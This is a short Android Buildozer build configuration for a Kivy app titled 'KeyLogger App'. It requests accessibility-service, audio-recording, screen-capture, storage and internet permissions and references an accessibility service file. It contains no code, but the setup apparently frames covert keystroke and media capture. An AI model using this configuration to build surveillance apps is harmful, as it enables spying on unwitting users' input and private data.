[app]
title = KeyLogger App
package.name = keylogger
package.domain = org.example
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,java,xml
version = 0.1
requirements = python3,kivy,pyjnius

[buildozer]
log_level = 2

[android]
android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,RECORD_AUDIO,BIND_ACCESSIBILITY_SERVICE,CAPTURE_VIDEO_OUTPUT
android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 33
android.build_tools = 30.0.3
android.add_src = src
android.extra_manifest_application_entry = %(source.dir)s/xml/accessibility_service.xml
p4a.branch = release-2022.12.20
